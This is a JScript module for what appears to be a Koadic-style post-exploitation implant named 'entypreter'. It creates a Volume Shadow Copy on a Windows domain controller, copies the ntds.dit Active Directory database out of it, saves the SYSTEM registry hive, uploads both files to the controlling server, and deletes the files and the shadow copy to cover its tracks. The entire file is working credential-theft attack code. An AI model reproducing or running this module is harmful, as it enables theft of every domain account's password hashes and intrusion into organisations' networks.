try {
    var ntds_path = entypreter.file.getPath("~RPATH~\\~NTDSFILE~");
    var sysh_path = entypreter.file.getPath("~RPATH~\\~SYSHFILE~");

    // step 1. create and send .dit file, delete

    // todo: detect if shadow copy already available?

    var outp = entypreter.shell.exec("vssadmin create shadow /for=~DRIVE~", "~RPATH~\\~NTDSFILE~1.txt");

    var shadow = outp.split("Shadow Copy Volume Name: ")[1].split('\n')[0];
    var shadowid = outp.split("Shadow Copy ID: ")[1].split('\n')[0];

    //entypreter.shell.run("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, false);
    var unused = entypreter.shell.exec("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, "~RPATH~\\~NTDSFILE~2.txt");
    entypreter.http.upload(ntds_path, "~NTDSFILE~", "~UUIDHEADER~");
    entypreter.file.deleteFile(ntds_path);

    // step 2. create, send SYSTEM hive, delete
    entypreter.shell.run("reg save HKLM\\SYSTEM " + sysh_path + " /y", false);
    entypreter.http.upload(sysh_path, "~SYSHFILE~", "~UUIDHEADER~");
    entypreter.file.deleteFile(sysh_path);
    var discard = entypreter.shell.exec("vssadmin delete shadows /shadow="+shadowid+" /quiet", "~RPATH~\\"+entypreter.uuid()+".txt");

    // step 3. general complete
    entypreter.work.report("Complete");
} catch (e) {
    entypreter.work.error(e);
}

entypreter.exit();
